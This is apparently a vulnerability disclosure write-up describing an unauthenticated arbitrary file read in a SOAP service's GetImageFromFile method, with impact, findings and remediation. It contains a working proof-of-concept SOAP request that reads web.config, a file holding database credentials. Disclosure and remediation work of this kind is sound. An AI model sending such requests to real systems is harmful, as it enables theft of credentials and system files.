# 🛡️ Unauthenticated Arbitrary File Read in SOAP DataService (LFI)

> [!CAUTION]
> **Vulnerability Discovery:** I identified a **Critical** vulnerability in a production SOAP service (`/dataService.svc`) that allows an unauthenticated attacker to read any file on the host operating system, including sensitive configuration files.

---

## 🔍 Vulnerability Type
*   **Vulnerability Name:** Unauthenticated Arbitrary File Read (LFI)
*   **Target:** `<TARGET_IP>:<PORT>/dataService.svc`
*   **Severity:** 🔴 **CRITICAL (CVSS 10.0)**
*   **Attack Vector:** Manual SOAP Injection / Parameter Manipulation

## 💥 Impact
This vulnerability leads to a **complete compromise of the application and internal infrastructure**:

*   **Sensitive Data Exposure:** Full access to `web.config`, disclosing database credentials (SQL Server), internal hostnames, and application secrets.
*   **Internal Network Mapping:** Exposure of internal hostnames (e.g., `dyb-sql-******`), enabling lateral movement within the corporate network.
*   **Full System Reconnaissance:** Ability to read sensitive OS files (e.g., `C:\Windows\win.ini`), identifying patch levels and potential local privilege escalation vectors.
*   **Stack Trace Disclosure:** Error messages reveal full internal logic and architecture, assisting in further exploit development.

## 🛠️ Proof of Concept (PoC)

An unauthenticated `POST` request was sent to the `GetImageFromFile` method with a direct path to the web configuration file:

```http
POST /dataService.svc HTTP/1.1
Host: <TARGET_IP>:<PORT>
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/IDataService/GetImageFromFile"

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetImageFromFile xmlns="http://tempuri.org/">
      <path>C:\inetpub\wwwroot\web.config</path>
    </GetImageFromFile>
  </soap:Body>
</soap:Envelope>
```

### 📸 Evidence

<img width="1885" height="777" alt="image" src="https://github.com/user-attachments/assets/4f374a66-bbf9-4eb1-9774-4203c1abd285" />


<p align="center"><i>Response contains the Base64-encoded content of the web.config file.</i></p>

---

## 📊 Findings Summary


| Severity | Title | Description |
| :--- | :--- | :--- |
| 🔴 **CRITICAL** | **Arbitrary File Read** | Unauthenticated access to `GetImageFromFile` allows reading any file on the system. |
| 🔴 **CRITICAL** | **Sensitive Data Leak** | `web.config` exposure leaked SQL credentials and internal network topology. |
| 🟠 **HIGH** | **Verbose Stack Traces** | Application leaks detailed internal error logs and code structure. |

## 🛡️ Remediation

1.  **Restrict File Access:** Implement a strict whitelist for file paths in the `GetImageFromFile` method. Never pass raw user input to file system APIs.
2.  **Authentication:** Require valid tokens/authentication for ALL methods in `dataService.svc`.
3.  **Disable Debugging:** Set `includeExceptionDetailInFaults="false"` in the production environment.
4.  **Legacy Tech:** Migrate from Silverlight to modern, supported web frameworks (React/Angular).

---
*Responsible disclosure followed. All data was handled according to ethical guidelines.*
